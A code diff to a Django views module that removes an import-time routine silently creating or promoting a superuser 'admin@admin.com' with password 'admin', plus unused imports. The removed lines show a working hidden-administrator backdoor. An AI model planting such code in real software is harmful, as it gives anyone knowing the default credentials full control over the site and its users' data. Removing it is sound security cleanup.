@@ -1,39 +1,12 @@
 from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib import messages
-from django.http import JsonResponse
-from django.contrib.auth import authenticate, login, logout
+from django.contrib.auth import logout
 from django.contrib.auth.decorators import login_required
 from django.contrib.auth.models import User
 from django.contrib.auth.views import LoginView
 from django.urls import reverse
-from django.core.validators import URLValidator
-from django.core.exceptions import ValidationError
 from django.db import OperationalError, ProgrammingError
 from django.core.paginator import Paginator
-
-
-# se asegura de que exista la cuenta administrativa
-# (email y usuario iguales) con contraseña "admin".
-# se ejecuta tan pronto como se importa la vista.
-def _ensure_admin_account():
-    try:
-        if not User.objects.filter(email='admin@admin.com').exists():
-            admin_user = User.objects.create_user(username='admin@admin.com',
-                                                  email='admin@admin.com',
-                                                  password='admin')
-            admin_user.is_staff = True
-            admin_user.is_superuser = True
-            admin_user.save()
-        else:
-            admin_user = User.objects.filter(email='admin@admin.com').first()
-            if admin_user and (not admin_user.is_staff or not admin_user.is_superuser):
-                admin_user.is_staff = True
-                admin_user.is_superuser = True
-                admin_user.save()
-    except Exception:
-        pass
-
-_ensure_admin_account()
 
 from .forms import CustomUserCreationForm
 import json
@@ -674,7 +647,7 @@ def admin_panel(request):
     todas_categorias = Categoria.objects.all().order_by('nombre')
 
     # Calcular métricas adicionales para el dashboard
-    from datetime import datetime, timedelta
+    from datetime import timedelta
     from django.utils import timezone
 
     # Pedidos pendientes
